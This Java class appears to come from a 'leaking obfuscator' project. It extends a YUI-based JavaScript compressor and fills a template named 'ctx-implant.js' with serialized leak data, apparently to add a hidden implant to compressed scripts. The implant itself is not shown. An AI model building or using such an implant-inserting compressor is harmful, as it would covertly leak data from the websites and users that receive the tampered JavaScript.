package com.leakingobfuscator.leaker;

import com.leakingobfuscator.common.LeakObject;
import com.yahoo.platform.yui.compressor.ShadowInputStreamReader;
import com.leakingobfuscator.leaker.implant.ImplantTemplate;
import org.mozilla.javascript.ErrorReporter;
import org.mozilla.javascript.EvaluatorException;

import java.io.IOException;
import java.util.HashMap;

public class ContextLeakingJavaScriptCompressor extends LeakingJavaScriptCompressor {

    private static final String IMPLANT_FN = "ctx-implant.js";

    public ContextLeakingJavaScriptCompressor(ShadowInputStreamReader in, ErrorReporter reporter) throws IOException, EvaluatorException {
        super(in, reporter);
    }

    @Override
    public String generateImplant(LeakObject leakObj) {
        try {
            HashMap<String, String> replacements = new HashMap<String, String>();
            replacements.put("c:" + FIELD_LEAK_OBJ, leakObj.toJSON());

            return ImplantTemplate.generate(IMPLANT_FN, replacements);
        } catch (IOException e) {
            return null;
        }
    }

}
